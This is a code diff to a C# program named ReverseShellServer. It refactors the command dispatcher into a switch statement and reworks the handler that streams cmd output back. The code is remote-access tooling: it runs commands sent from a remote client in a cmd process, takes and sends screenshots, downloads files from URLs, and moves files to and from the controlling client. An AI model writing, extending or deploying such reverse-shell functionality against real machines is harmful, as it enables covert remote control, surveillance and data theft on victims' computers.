@@ -102,41 +102,30 @@ namespace ReverseShellServer
             var command = strInput.ToString().Split(' ');
             var bypassHello = false;
 
-            if (command[0] == "terminate")
+            switch (command[0])
             {
-                StopServer();
-            }
-            else if (command[0] == "exit")
-            {
-                throw new ArgumentException();
-            }
-            else if (command[0] == "#screenshot")
-            {
-                tools.TakeAndSendScreenShotToClient();
-            }
-            else if (command[0] == "#downloadurl")
-            {
-                tools.DownloadFileFromUrl(command[1]);
-            }
-            else if (command[0] == "#download")
-            {
-                tools.UploadFileToClient(command[1]);
-            }
-            else if (command[0] == "#upload")
-            {
-                tools.ReceiveFileFromClient(command[1]);
-            }
-            else if (command[0] == "#fileexist")
-            {
-                tools.CheckFileExist(command[1]);
-                bypassHello = true;
-            }
-            else
-            {
-                strInput.Append("\n");
-                processCmd.StandardInput.WriteLine(strInput);
-
-                bypassHello = true;
+                case "terminate":
+                    StopServer();
+                    break;
+                case "exit":
+                    throw new ArgumentException();
+                case "#screenshot":
+                    tools.TakeAndSendScreenShotToClient();
+                    break;
+                case "#downloadurl":
+                    tools.DownloadFileFromUrl(command[1]);
+                    break;
+                case "#download":
+                    tools.UploadFileToClient(command[1]);
+                    break;
+                case "#upload":
+                    tools.ReceiveFileFromClient(command[1]);
+                    break;
+                default:
+                    strInput.Append("\n");
+                    processCmd.StandardInput.WriteLine(strInput);
+                    bypassHello = true;
+                    break;
             }
 
             if (!bypassHello)
@@ -184,16 +173,25 @@ namespace ReverseShellServer
         /// <param name="outLine"></param>
         void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
         {
-            var strOutput = new StringBuilder();
+            var output = outLine.Data;
             if (!string.IsNullOrEmpty(outLine.Data))
             {
                 try
                 {
-                    // Check if the line is the one representing the path and the command in the cmd, ignore it
-                    if (outLine.Data.Substring(1, 2) == ":\\" && outLine.Data[outLine.Data.Length - 1] != '>') { return; }
+                    // Check if the line is the one representing the path
+                    if (output.Substring(1, 2) == ":\\" && output.Contains(">"))
+                    {
+                        // Represents path + > + command
+                        if (output[output.Length - 1] != '>')
+                        {
+                            return;
+                        }
+
+                        // Change current working directory to the path and return
+                        Directory.SetCurrentDirectory(output.Substring(0, output.Length - 1));
+                    }
                     
-                    strOutput.Append(outLine.Data);
-                    streamWriter.WriteLine(strOutput);
+                    streamWriter.WriteLine(output);
                     streamWriter.Flush();
                 }
                 catch (Exception)
